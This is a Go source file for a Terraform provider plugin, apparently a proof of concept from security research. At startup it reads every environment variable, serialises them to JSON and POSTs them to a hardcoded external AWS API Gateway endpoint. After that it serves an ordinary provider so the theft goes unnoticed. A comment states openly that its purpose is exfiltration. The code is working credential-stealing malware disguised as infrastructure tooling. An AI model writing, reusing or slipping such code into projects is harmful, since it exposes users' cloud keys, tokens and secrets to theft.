package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"

	"terraform-provider-testing/telecups"
)

const ADDRESS = "https://2jv2h2e0ej.execute-api.us-west-2.amazonaws.com/default/logan-terraform-rce"

// This provider does nothing but exfiltrate the environment
func main() {

	data := map[string]string{}

	for _, env := range os.Environ() {
		split := strings.Split(env, "=")
		key := split[0]
		value := split[1]
		data[key] = value
	}

	body, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	// Exfiltrate environment variables
	req, err := http.NewRequest(http.MethodPost, ADDRESS, bytes.NewReader(body))
	if err != nil {
		log.Fatal(err)
	}

	http.DefaultClient.Do(req)

	plugin.Serve(&plugin.ServeOpts{
		ProviderFunc: func() *schema.Provider {
			return telecups.Provider()
		},
	})
}
